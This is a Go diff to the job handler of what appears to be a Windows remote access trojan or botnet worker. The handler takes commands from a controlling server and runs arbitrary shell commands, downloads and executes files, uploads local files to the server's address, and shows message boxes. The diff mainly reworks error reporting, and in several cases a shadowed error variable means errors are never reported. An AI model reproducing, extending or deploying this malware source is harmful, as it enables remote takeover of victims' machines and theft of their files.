@@ -152,44 +152,46 @@ func (w *Worker) poll() {
 func (w *Worker) resolve(job *Job) {
 	todo, args := job.parse()
 	fmt.Println(job.Todo)
-	fmt.Println(job.Created)
+	var err error
 	switch todo {
 	case SHELL_CMD:
-		output, _ := win.ExecuteCommand(args...) // TODO: check for errors and send error message as report
-		w.report(job.Id, output)
+		output, err := win.ExecuteCommand(args...)
+		if err == nil {
+			w.report(job.Id, output)
+		}
 	case BOOST:
 		w.boostMode = args[0] == "on" // TODO: check inside parseJob whether args are correct
 		w.report(job.Id, "Boost mode changed.")
 	case SLEEP:
 		val, err := strconv.Atoi(args[0])
-		if err != nil {
-			w.report(job.Id, err.Error())
-		} else {
+		if err == nil {
 			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
 			time.Sleep(time.Duration(val) * time.Second)
 		}
 	case DOWNLOAD:
-		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
-			w.report(job.Id, err.Error())
-		} else {
+		err = win.DownloadNExecute(args[0], args[1])
+		if err == nil {
 			w.report(job.Id, "File downloaded and executed.")
 		}
 	case UPLOAD:
 		dest := buildRequestUrl(UPLOADS_R, w.id, "")
 		loc, err := utils.UploadFile(args[0], dest)
-		if err != nil {
-			w.report(job.Id, err.Error())
-		} else {
+		if err == nil {
 			w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
 		}
 	case CHDIR:
-		if err := os.Chdir(args[0]); err != nil {
-			w.report(job.Id, err.Error())
-		} else {
+		err = os.Chdir(args[0])
+		if err == nil {
 			w.report(job.Id, "Directory changed to "+args[0])
 		}
+	case MSG_BOX:
+		go win.ShowMessageBox(0, args[0], args[1], win.MB_OK)
+		w.report(job.Id, "Message shown successfully.")
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
+	}
+	if err != nil {
+		w.report(job.Id, err.Error())
 	}
 }
 
